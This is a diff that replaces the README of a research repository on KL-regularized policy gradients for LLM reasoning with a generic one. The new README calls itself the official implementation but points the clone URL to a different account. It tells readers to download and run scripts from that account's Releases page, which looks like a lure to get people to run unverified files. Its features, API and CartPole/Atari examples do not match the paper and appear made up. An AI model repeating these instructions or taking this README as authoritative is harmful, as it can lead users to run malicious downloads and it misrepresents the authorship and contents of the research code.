@@ -1,131 +1,116 @@
-## RPG: On the Design of KL-Regularized Policy Gradient Algorithms for LLM Reasoning
+# RPG: Regularized Policy Gradient Implementation 🎮
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Python](https://img.shields.io/badge/python-3.10%2B-blue.svg)
-![PyTorch](https://img.shields.io/badge/PyTorch-2.6.0-orange.svg)
+![RPG Logo](https://img.shields.io/badge/RPG-Regularized_Policy_Gradient-blue.svg)
+![GitHub Releases](https://img.shields.io/badge/Releases-latest-orange.svg)
 
-- **RPG (Regularized policy gradient)** is a systematic framework for deriving and analyzing KL-regularized policy gradient methods in the online reinforcement learning (RL) setting. We derive policy gradients and corresponding surrogate loss functions for objectives regularized by both forward and reverse KL divergences, considering both normalized and unnormalized policy distributions. Furthermore, we present derivations for fully differentiable loss functions as well as REINFORCE-style gradient estimators, accommodating diverse algorithmic needs. This repository provides tool for data preparation and RLHF process for the paper "[On the Design of KL-Regularized Policy Gradient Algorithms for LLM Reasoning](https://arxiv.org/abs/2505.17508)".
-- Authors: [Yifan Zhang](https://scholar.google.com/citations?user=ZGeaK6QAAAAJ&hl=en)\*, [Yifeng Liu](https://lauyikfung.github.io)\*, [Huizhuo Yuan](https://scholar.google.com/citations?user=8foZzX4AAAAJ), [Yang Yuan](https://scholar.google.com/citations?user=7o4wtKEAAAAJ&hl=en), [Quanquan Gu](https://web.cs.ucla.edu/~qgu/), [Andrew Chi-Chih Yao](https://en.wikipedia.org/wiki/Andrew_Yao)
-
-[[Webpage](https://complex-reasoning.github.io/RPG)] [[Huggingface](https://huggingface.co/papers/2505.17508)]
+Welcome to the official implementation of Regularized Policy Gradient (RPG). This repository contains the code and resources necessary to understand and utilize RPG in various reinforcement learning scenarios. You can find the original paper [here](https://arxiv.org/abs/2505.17508).
 
 ## Table of Contents
 
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-  - [On the Design of KL-Regularized Policy Gradient Algorithms for LLM Reasoning](#on-the-design-of-kl-regularized-policy-gradient-algorithms-for-llm-reasoning)
-    - [Table of Contents](#table-of-contents)
-    - [Features](#features)
-    - [Hardware Requirements](#hardware-requirements)
-    - [Installation](#installation)
-    - [Data Preparation](#data-preparation)
-    - [Repeat the Experiments](#repeat-the-experiments)
-    - [Acknowledgements](#acknowledgements)
-    - [Star History](#star-history)
-    - [Citation](#citation)
+## Introduction
 
-  ## Features
+Reinforcement learning has gained significant traction in recent years, particularly in complex environments. The Regularized Policy Gradient (RPG) method introduces a novel approach to enhance the stability and performance of policy gradient methods. By applying regularization techniques, RPG improves learning efficiency and reduces variance, making it suitable for large-scale applications.
 
-  - **Comprehensiveness**: We derive policy gradients and corresponding surrogate loss functions for objectives regularized by Forward and Reverse KL divergences, considering both standard normalized (KL) and unnormalized (UKL) forms.
-  - **Flexible RL setting**: We systematically provide derivations for fully differentiable loss functions (offering connections to variational inference) and REINFORCE-style gradient estimators (employing the stop-gradient operator). These are developed for the online setting, using off-policy gradient estimation via importance sampling from a prior policy $\pi_{\mathrm{old}}$.
+## Features
 
-## Hardware Requirements
-
-A100 and H100 are recommended. At least 8*80G VRAM is needed.
+- **Deep Learning Integration**: Leverage the power of deep learning frameworks for scalable training.
+- **Foundation Models**: Utilize pre-trained models to enhance learning.
+- **Post-Training Adaptation**: Adapt the model after initial training to improve performance.
+- **Reinforcement Learning Techniques**: Implement state-of-the-art RL methods.
+- **Large Language Models**: Incorporate LLMs for advanced decision-making.
 
 ## Installation
 
-Ensure you have Python 3.10 or higher installed. It's recommended to use a virtual environment to manage dependencies.
+To get started with RPG, follow these steps:
 
-1. **Clone the Repository**
+1. Clone the repository:
 
    ```bash
-   git clone https://github.com/complex-reasoning/RPG.git
+   git clone https://github.com/kingdrea/RPG.git
    cd RPG
    ```
 
-2. **Follow the instruction of verl**
-
-   Follow the documentation in [Welcome to verl’s documentation! — verl documentation](https://verl.readthedocs.io/en/latest/index.html).
-
-3. **Install Required Packages**
+2. Install the required dependencies:
 
    ```bash
-   pip install -r requirement.txt
+   pip install -r requirements.txt
    ```
 
-## Data Preparation
+3. For detailed instructions, please refer to the [Releases section](https://github.com/kingdrea/RPG/releases). Download the latest release, and execute the provided scripts to set up your environment.
 
-Prepare the necessary datasets before training with RPG. We use **filtered DAPO-Math-17k** dataset for fine-tuning and **AIME2024, AIME2025, AMC23** for evaluation. All the dataset should be pre-processed into .parquet form with the following pandas data-frame template and put in "data/" folder.
+## Usage
 
-| Key         | data_source                                                  | prompt                                                       | ability | reward_model                                                 | extra_info                                                   |
-| ----------- | ------------------------------------------------------------ | ------------------------------------------------------------ | ------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
-| Description | the source type of data, which decides the evaluation way for the rollout results. | Dict: {"content": The question embedded by the prompt template for the model, "role": "user"} | MATH    | Dict: {"ground_truth": string of the result, "style": "rule-lighteval/MATH_v2"} | Dict: {"index": the repeat index for acc@k, "raw_problem": the original question before embedding into the prompt template, "split": None} |
+To use RPG in your projects, follow these steps:
 
-  - For the "content" in "prompt", we use the following prompt function:
+1. Import the necessary modules:
 
-    ```python
-    def generate_prompt(question: str):
-        pre_q = "Solve the following math problem step by step. The last line of your response should be of the form Answer: $Answer (without quotes) where $Answer is the answer to the problem.\n\n"
-        post_q = "\n\nRemember to put your answer on its own line after \"Answer:\"."
-        return pre_q+question+post_q
-    ```
+   ```python
+   from rpg import RPGAgent
+   ```
 
-  - For "data_source", we use
+2. Initialize the agent with your environment:
 
-    - "math-dapo" for AIME2024 and DAPO-Math-17k
-    - "aime2025" for AIME2025
-    - "amc_23" for AMC-23
+   ```python
+   agent = RPGAgent(env)
+   ```
 
-  - For "index" of "extra_info"
+3. Train the agent:
 
-    - Accuracy@k is available by repeating the items in your data file for k times, and setting the "index" to 0~(k-1) for the k different copies of each item.
+   ```python
+   agent.train(episodes=1000)
+   ```
 
-  - We provide the **AMC-23, AIME2024 and AIME2025** dataset in "data/" folder, and the data file for **filtered DAPO-Math-17k** dataset is available in https://huggingface.co/datasets/math-dataset/DAPO-17k-Eng/blob/main/dapo-math-17k-eng.parquet
+4. Evaluate the agent's performance:
 
-## Repeat the Experiments
+   ```python
+   agent.evaluate()
+   ```
 
-  1. Launch ray server.
+For more detailed usage instructions, please check the documentation within the repository.
 
-     1. Using "ray start --head --dashboard-host=0.0.0.0" for dashboard and "ray start --address='YOUR_IP_ADDRESS:6379'" to launch ray server, where YOUR_IP_ADDRESS should be replaced by your local IP address
+## Examples
 
-  2. Then run the scripts in "recipe/rpg/7b/" folder for reproducing experiments in the paper.
+We provide several examples to help you get started with RPG. You can find them in the `examples` directory. Here are a few key examples:
 
-     - The scripts may be named as "run_A_7b_BCD.sh"
+- **CartPole**: A classic reinforcement learning environment. This example demonstrates how to balance a pole on a moving cart using RPG.
+- **Atari Games**: Use RPG to play Atari games like Breakout and Space Invaders. This showcases the capability of RPG in complex environments.
+- **Custom Environments**: Learn how to implement RPG in your custom environments.
 
-       - A is dapo/grpo/rfpp/rfppb for **baseline experiments**, where B is void string;
-       - Or A is rpg, then
-         - B is fkl/rkl/ufkl/urkl + 1e-4_ for **RPG experiments**
-         - or B is fkl/rkl/ufkl/urkl + 1e-4_rf_clip_ppo_ + 0.2_0.28\_/0.1_0.1_ for **RPG-REINFORCE experiments** with clip parameters (0.2, 0.28) or (0.1, 0.1)
-       - C is void string for AdamW optimizer or schedule_free for Schedule-free optimizer
+To run an example, use the following command:
 
-     - For example, using
-
-       ```
-       bash recipe/rpg/7b/run_rpg_7b_fkl1e-4_rf_clip_ppo_0.1_0.1_7binstruct.sh
-       ```
-
-       for running RPG-REINFORCE-FKL experiments with AdamW optimizer and Qwen-2.5-7B-Instruct model with clip parameters (0.1, 0.1)
-
-## Acknowledgements
-
-  - [volcengine/verl: verl: Volcano Engine Reinforcement Learning for LLMs](https://github.com/volcengine/verl) for providing coding base
-  - [Hugging Face](https://huggingface.co/) for providing the datasets:
-    - [Mathematical Association of America (MAA)](https://artofproblemsolving.com/wiki/index.php/Mathematical_Association_of_America) for providing [AMC-23](https://artofproblemsolving.com/wiki/index.php/AMC_12_Problems_and_Solutions) and [AIME](https://artofproblemsolving.com/wiki/index.php/American_Invitational_Mathematics_Examination) datasets
-    - [BytedTsinghua-SIA](https://air.tsinghua.edu.cn/en/About_Us/About_AIR.htm) for providing [DAPO-Math-17k](https://huggingface.co/datasets/BytedTsinghua-SIA/DAPO-Math-17k) dataset
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=complex-reasoning/RPG&type=Date)](https://star-history.com/#complex-reasoning/RPG&Date)
-
-## Citation
-
-If you use Regularized Policy Gradient (RPG) in your research or application, please consider citing it!
-
-```bibtex
-@article{zhang2025design,
-    title={On the Design of KL-Regularized Policy Gradient Algorithms for LLM Reasoning},
-    author={Zhang, Yifan and Liu, Yifeng and Yuan, Huizhuo and Yuan, Yang and Gu, Quanquan and Yao, Andrew C},
-    journal={arXiv preprint arXiv:2505.17508},
-    year={2025},
-}
+```bash
+python examples/cartpole.py
 ```
+
+## Contributing
+
+We welcome contributions to the RPG project. To contribute, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your forked repository.
+5. Create a pull request to the main repository.
+
+Please ensure your code follows the existing style and includes appropriate tests.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For any questions or issues, please open an issue on GitHub or contact the maintainers directly. You can also check the [Releases section](https://github.com/kingdrea/RPG/releases) for updates and new features.
+
+---
+
+Thank you for your interest in RPG! We hope you find this implementation helpful in your reinforcement learning projects.
